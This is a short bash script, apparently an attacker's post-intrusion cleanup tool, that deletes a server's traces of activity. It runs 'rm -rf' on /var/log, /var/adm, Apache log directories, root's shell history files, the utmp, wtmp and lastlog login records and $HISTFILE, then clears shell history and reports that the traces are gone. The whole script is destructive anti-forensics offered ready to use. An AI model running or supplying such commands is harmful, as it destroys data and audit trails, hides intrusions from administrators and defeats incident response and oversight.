#!/bin/bash
# delete log

rm -rf /tmp/logs
sleep 2
echo 'Deleting .../tmp/logs'
rm -rf /root/.ksh_history
sleep 2
echo 'Deleting .../.ksh_history'
rm -rf /root/.bash_history
sleep 2
echo 'Deleting .../.bash_history'
rm -rf /root/.bash_logout
sleep 2
echo 'Deleting .../.bash_logout'
rm -rf /usr/local/apache/logs
sleep 2
echo 'Deleting .../apache/logs'
rm -rf /usr/local/apache/log
sleep 2
echo 'Deleting .../usr/local/apache/log'
rm -rf /var/apache/logs
sleep 2
echo 'Deleting .../var/apache/logs'
rm -rf /var/apache/log
sleep 2
echo 'Deleting .../var/apache/log'
rm -rf /var/run/utmp
sleep 2
echo 'Deleting .../var/run/utmp'
rm -rf /var/logs
sleep 2
echo 'Deleting .../var/logs'
rm -rf /var/log
sleep 2
echo 'Deleting .../var/log'
rm -rf /var/adm
sleep 2
echo 'Deleting .../var/adm'
rm -rf /etc/wtmp
sleep 2
echo 'Deleting .../etc/wtmp'
rm -rf /etc/utmp
sleep 2
echo 'Deleting .../etc/utmp'
rm -rf $HISTFILE
sleep 2
echo 'Deleting ...$HISTFILE'
rm -rf /var/log/lastlog
sleep 2
echo 'Deleting .../var/log/lastlog'
rm -rf /var/log/wtmp
sleep 2
echo 'Deleting .../var/log/wtmp'
history -c
sleep 2
echo 'Deleting ...history -c'
sleep 4
echo 'Your Traces Has Been Successfully Deleting ...From the Server'